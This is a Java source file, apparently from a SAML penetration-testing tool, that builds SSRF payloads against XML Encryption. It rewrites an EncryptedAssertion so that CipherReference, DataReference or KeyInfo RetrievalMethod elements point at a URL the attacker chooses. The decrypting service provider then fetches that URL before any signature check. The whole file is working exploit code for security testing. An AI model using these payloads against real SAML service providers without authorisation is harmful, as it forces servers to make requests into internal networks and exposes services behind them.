package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import java.io.IOException;

/// SSRF / blind-URL-fetch primitives against XML Encryption structures inside
/// a SAML <EncryptedAssertion>.
///
/// XML Encryption processors resolve several URI-bearing elements while decrypting:
///   - <xenc:CipherReference URI="..."/>         — ciphertext is fetched from URI
///   - <xenc:DataReference URI="..."/>           — pointer to encrypted element
///   - <ds:RetrievalMethod URI="..."/> inside
///     <xenc:EncryptedKey>/<ds:KeyInfo>          — key material fetched from URI
///
/// Any of these get dereferenced before the decrypted content is validated or
/// consumed, which turns the SP's encryption processor into an SSRF oracle.
/// Because decryption generally happens before signature verification (for
/// response decrypt-then-verify flows), these attacks do not require any
/// signing capability.
///
/// References:
/// * W3C XML Encryption 1.1:            https://www.w3.org/TR/xmlenc-core1/
/// * GreenDog SAML talk (KazHackStan 2023): slide deck `doc/KazHackStan._SAML_Hacking.pdf`
/// * Viettel "SAML Show-Stopper":       https://blog.viettelcybersecurity.com/saml-show-stopper/
public class EncryptionSSRF {

    private static final String XENC_NS = "http://www.w3.org/2001/04/xmlenc#";
    private static final String DS_NS   = "http://www.w3.org/2000/09/xmldsig#";

    public enum Mode {
        ALL(
                "All 3 — CipherReference + DataReference + EncryptedKey KeyInfo"),
        CIPHER_REFERENCE(
                "CipherReference — ciphertext fetched from URL during decrypt"),
        DATA_REFERENCE(
                "DataReference — EncryptedKey/ReferenceList pointer fetched"),
        ENCRYPTED_KEY_KEYINFO(
                "EncryptedKey KeyInfo RetrievalMethod — key material fetched");

        private final String label;
        Mode(String label) { this.label = label; }
        @Override public String toString() { return label; }
    }

    public static String apply(String samlMessage, Mode mode, String url)
            throws SAXException, IOException {
        if (url == null || url.isBlank()) {
            throw new IllegalArgumentException("Retrieval URL must not be empty.");
        }

        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        switch (mode) {
            case ALL -> {
                applyCipherReference(document, url);
                applyDataReference(document, url);
                applyEncryptedKeyKeyInfo(document, url);
            }
            case CIPHER_REFERENCE      -> applyCipherReference(document, url);
            case DATA_REFERENCE        -> applyDataReference(document, url);
            case ENCRYPTED_KEY_KEYINFO -> applyEncryptedKeyKeyInfo(document, url);
        }

        return xmlHelpers.getString(document);
    }

    // --- CipherReference: replace the first <xenc:CipherValue> with a <xenc:CipherReference URI=.../> ---

    private static void applyCipherReference(Document document, String url) {
        NodeList cipherDatas = document.getElementsByTagNameNS(XENC_NS, "CipherData");
        if (cipherDatas.getLength() == 0) {
            throw new IllegalArgumentException(
                    "No xenc:CipherData element found — is there an EncryptedAssertion/EncryptedData?");
        }
        Element cipherData = (Element) cipherDatas.item(0);

        // Remove existing CipherValue / CipherReference children.
        for (String childLocal : new String[]{"CipherValue", "CipherReference"}) {
            NodeList existing = cipherData.getElementsByTagNameNS(XENC_NS, childLocal);
            for (int i = existing.getLength() - 1; i >= 0; i--) {
                Node n = existing.item(i);
                n.getParentNode().removeChild(n);
            }
        }

        String prefix = cipherData.getPrefix();
        String qname = (prefix == null || prefix.isEmpty())
                ? "CipherReference" : prefix + ":CipherReference";
        Element cipherRef = document.createElementNS(XENC_NS, qname);
        cipherRef.setAttribute("URI", url);
        cipherData.appendChild(cipherRef);
    }

    // --- DataReference: point the first EncryptedKey's ReferenceList at an external URI ---

    private static void applyDataReference(Document document, String url) {
        NodeList encKeys = document.getElementsByTagNameNS(XENC_NS, "EncryptedKey");
        if (encKeys.getLength() == 0) {
            throw new IllegalArgumentException(
                    "No xenc:EncryptedKey element found — DataReference requires an EncryptedKey wrapper.");
        }
        Element encKey = (Element) encKeys.item(0);

        // Find or create the ReferenceList (direct child of EncryptedKey).
        Element refList = firstChildElement(encKey, XENC_NS, "ReferenceList");
        String prefix = encKey.getPrefix();
        String xencPrefix = (prefix == null || prefix.isEmpty()) ? "" : prefix + ":";
        if (refList == null) {
            refList = document.createElementNS(XENC_NS, xencPrefix + "ReferenceList");
            encKey.appendChild(refList);
        } else {
            // Wipe existing DataReference / KeyReference children so only ours remains.
            while (refList.hasChildNodes()) refList.removeChild(refList.getFirstChild());
        }

        Element dataRef = document.createElementNS(XENC_NS, xencPrefix + "DataReference");
        dataRef.setAttribute("URI", url);
        refList.appendChild(dataRef);
    }

    // --- EncryptedKey KeyInfo RetrievalMethod: make the SP fetch key material ---

    private static void applyEncryptedKeyKeyInfo(Document document, String url) {
        NodeList encKeys = document.getElementsByTagNameNS(XENC_NS, "EncryptedKey");
        if (encKeys.getLength() == 0) {
            throw new IllegalArgumentException(
                    "No xenc:EncryptedKey element found — this mode requires an EncryptedKey.");
        }
        Element encKey = (Element) encKeys.item(0);

        // EncryptedKey carries its own ds:KeyInfo describing the *wrapping* key.
        Element keyInfo = firstChildElement(encKey, DS_NS, "KeyInfo");
        if (keyInfo == null) {
            // Create one at the start of the EncryptedKey element.
            keyInfo = document.createElementNS(DS_NS, "ds:KeyInfo");
            encKey.insertBefore(keyInfo, encKey.getFirstChild());
        } else {
            while (keyInfo.hasChildNodes()) keyInfo.removeChild(keyInfo.getFirstChild());
        }

        String kiPrefix = keyInfo.getPrefix();
        String qname = (kiPrefix == null || kiPrefix.isEmpty())
                ? "RetrievalMethod" : kiPrefix + ":RetrievalMethod";
        Element retrieval = document.createElementNS(DS_NS, qname);
        retrieval.setAttribute("URI", url);
        retrieval.setAttribute("Type", "http://www.w3.org/2001/04/xmlenc#EncryptedKey");
        keyInfo.appendChild(retrieval);
    }

    private static Element firstChildElement(Element parent, String ns, String localName) {
        for (Node n = parent.getFirstChild(); n != null; n = n.getNextSibling()) {
            if (n.getNodeType() == Node.ELEMENT_NODE
                    && ns.equals(n.getNamespaceURI())
                    && localName.equals(n.getLocalName())) {
                return (Element) n;
            }
        }
        return null;
    }

    private EncryptionSSRF() {}
}
